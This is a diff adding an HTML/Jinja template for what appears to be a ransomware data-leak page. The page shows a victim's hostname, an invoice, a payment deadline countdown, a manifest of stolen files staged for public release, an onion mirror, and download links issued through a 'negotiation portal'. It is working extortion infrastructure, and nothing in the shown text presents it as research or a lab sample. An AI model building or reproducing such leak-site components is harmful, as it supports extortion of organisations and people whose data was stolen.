@@ -1,0 +1,123 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>{{ v['hostname'] or 'data release' }} :: leak</title>
+<style>
+:root{color-scheme:dark;--bg:#030504;--line:#163a26;--line2:#215c3c;--text:#bdffd6;--muted:#5f9c78;--dim:#3b6a52;--green:#39ff88;--red:#ff4d6d;--amber:#ffcc66;--cyan:#5ffbf1}
+*{box-sizing:border-box}
+body{margin:0;min-height:100vh;color:var(--text);background:
+  radial-gradient(900px 520px at 70% -15%,rgba(255,77,109,.10),transparent 62%),
+  repeating-linear-gradient(0deg,transparent 0 39px,rgba(57,255,136,.02) 39px 40px),
+  repeating-linear-gradient(90deg,transparent 0 39px,rgba(57,255,136,.016) 39px 40px),var(--bg);
+  font:13px/1.6 "Cascadia Code","JetBrains Mono",Consolas,monospace}
+body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:9;
+  background:repeating-linear-gradient(0deg,rgba(0,0,0,.22) 0 1px,transparent 1px 3px);opacity:.3}
+body::after{content:"";position:fixed;inset:0;pointer-events:none;z-index:8;
+  background:radial-gradient(120% 90% at 50% 45%,transparent 55%,rgba(0,0,0,.6))}
+.wrap{max-width:980px;margin:0 auto;padding:40px 18px 60px;position:relative;z-index:10}
+.ascii{color:var(--red);font-size:10px;line-height:1.15;letter-spacing:1px;margin-bottom:18px;white-space:pre;text-shadow:0 0 14px rgba(255,77,109,.35)}
+.eyebrow{color:var(--red);font-size:9px;letter-spacing:3px;text-transform:uppercase}
+.eyebrow::before{content:"[ "}.eyebrow::after{content:" ]"}
+h1{font-size:28px;letter-spacing:1px;margin:8px 0 6px;color:#fff;text-transform:uppercase}
+h1 .cursor{display:inline-block;width:10px;height:22px;background:var(--red);vertical-align:-3px;animation:blink 1s steps(1) infinite}
+@keyframes blink{50%{opacity:0}}
+.sub{color:var(--muted)}
+.hero{border:1px solid #3a1620;padding:20px;margin-bottom:14px;
+  background:linear-gradient(150deg,rgba(255,77,109,.06),rgba(3,8,5,.94));position:relative}
+.hero::before{content:"";position:absolute;top:0;left:0;width:100%;height:2px;background:linear-gradient(90deg,var(--red),transparent)}
+.badges{display:flex;gap:6px;flex-wrap:wrap;margin-top:12px}
+.badge{border:1px solid var(--line2);padding:1px 7px;font-size:9px;letter-spacing:1.2px;text-transform:uppercase;color:var(--muted)}
+.badge::before{content:"[";color:var(--dim)}.badge::after{content:"]";color:var(--dim)}
+.badge.red{border-color:#5c1f2b;color:var(--red);background:rgba(255,77,109,.05)}
+.badge.ok{border-color:rgba(57,255,136,.4);color:var(--green)}
+.kpis{display:grid;grid-template-columns:repeat(auto-fit,minmax(145px,1fr));gap:8px;margin:12px 0}
+.kpi{border:1px dashed var(--line2);padding:10px 12px;background:rgba(3,9,6,.7)}
+.kpi span{display:block;color:var(--dim);font-size:8.5px;letter-spacing:1.6px;text-transform:uppercase}
+.kpi b{display:block;font-size:19px;margin-top:3px;color:var(--green);font-weight:600}
+.kpi b.red{color:var(--red)}
+.panel{border:1px solid var(--line);padding:16px;margin-top:12px;background:linear-gradient(180deg,rgba(6,14,9,.92),rgba(3,8,5,.95));position:relative}
+.panel::before,.panel::after{content:"";position:absolute;width:9px;height:9px;border-color:var(--red);border-style:solid}
+.panel::before{top:-1px;left:-1px;border-width:2px 0 0 2px}
+.panel::after{bottom:-1px;right:-1px;border-width:0 2px 2px 0}
+h2{font-size:10px;letter-spacing:2px;text-transform:uppercase;color:var(--green);margin:0 0 8px}
+h2::before{content:"## ";color:var(--dim)}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th{text-align:left;color:var(--green);font-size:8.5px;letter-spacing:1.7px;text-transform:uppercase;
+  padding:7px 8px;border-bottom:1px solid var(--line2);background:rgba(57,255,136,.035)}
+td{padding:8px;border-bottom:1px dotted #123322;vertical-align:top}
+tr:last-child td{border-bottom:0}tr:hover td{background:rgba(255,77,109,.04)}
+a{color:var(--green);text-decoration:none;border-bottom:1px dotted rgba(57,255,136,.4)}
+a:hover{background:var(--green);color:#021008;border-color:transparent}
+code{color:var(--cyan);border:1px dashed rgba(95,251,241,.25);padding:1px 5px;word-break:break-all}
+.note{color:var(--muted);font-size:11px;margin-top:12px;border-left:2px solid var(--red);padding-left:10px}
+.countdown{color:var(--amber);font-variant-numeric:tabular-nums}
+.footer{margin-top:24px;color:var(--dim);font-size:9px;letter-spacing:1.6px;text-transform:uppercase;text-align:center}
+@media(max-width:620px){.wrap{padding:26px 12px 44px}h1{font-size:22px}.ascii{font-size:7px}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <pre class="ascii"> _   _ _____ __  __    _     _____    _    _  __
+| | | | ____|\ \/ /   | |   | ____|  / \  | |/ /
+| |_| |  _|   \  /    | |   |  _|   / _ \ | ' /
+ \___/|_____| /_/     |_____|_____| /_/ \_\|_|\_\</pre>
+  <section class="hero">
+  <div class="eyebrow">data release notice</div>
+  <h1>{{ v['hostname'] or 'recovered data' }}<span class="cursor"></span></h1>
+  <p class="sub">Files extracted from this machine are staged for public release. Payment and negotiation are handled through the recovery portal.</p>
+  <div class="badges">
+    <span class="badge red">invoice {{ invoice }}</span>
+    {% if deadline %}<span class="badge">deadline {{ deadline }}</span>{% endif %}
+    <span class="badge">{{ uploads|length }} files</span>
+    {% if token %}<span class="badge ok">authorized</span>{% endif %}
+  </div>
+  </section>
+
+  <div class="kpis">
+    <div class="kpi"><span>staged volume</span><b>{% if total >= 1048576 %}{{ '%.1f'|format(total / 1048576) }} MiB{% elif total >= 1024 %}{{ '%.1f'|format(total / 1024) }} KiB{% else %}{{ total }} B{% endif %}</b></div>
+    <div class="kpi"><span>files</span><b>{{ uploads|length }}</b></div>
+    <div class="kpi"><span>status</span><b class="red">SEALED</b></div>
+    {% if deadline %}<div class="kpi"><span>release window</span><b class="countdown" id="countdown">—</b></div>{% endif %}
+  </div>
+
+  <div class="panel">
+    <h2>release manifest</h2>
+    <table>
+      <tr><th>name</th><th>size</th><th>sha256</th><th>staged</th></tr>
+      {% for u in uploads %}
+      <tr>
+        <td>{% if token %}<a href="{{ url_for('leak_download', vid=v['vid'], uid=u['id'], t=token) }}">{{ u['name'] }}</a>{% else %}{{ u['name'] }}{% endif %}</td>
+        <td>{{ u['size'] }} B</td>
+        <td class="sub">{{ (u['sha256'] or '')[:16] }}</td>
+        <td class="sub">{{ u['ts'] }}</td>
+      </tr>
+      {% else %}
+      <tr><td colspan="4" class="sub">nothing staged yet</td></tr>
+      {% endfor %}
+    </table>
+    {% if onion %}<p class="note">onion mirror: <code>{{ onion }}</code></p>{% endif %}
+    {% if not token %}<p class="note">download links are issued by the operator through the negotiation portal.</p>{% endif %}
+  </div>
+
+  <p class="footer">release {{ invoice }} :: do not distribute this page</p>
+</div>
+{% if deadline %}
+<script>
+(function(){
+  var end = new Date("{{ deadline }}".replace(" ", "T"));
+  var el = document.getElementById("countdown");
+  function tick(){
+    var ms = end - new Date();
+    if (ms <= 0) { el.textContent = "CLOSED"; return; }
+    var d=Math.floor(ms/86400000),h=Math.floor(ms%86400000/3600000),m=Math.floor(ms%3600000/60000);
+    el.textContent=d+"d "+h+"h "+m+"m";
+    setTimeout(tick,30000);
+  }
+  tick();
+})();
+</script>
+{% endif %}
+</body>
+</html>
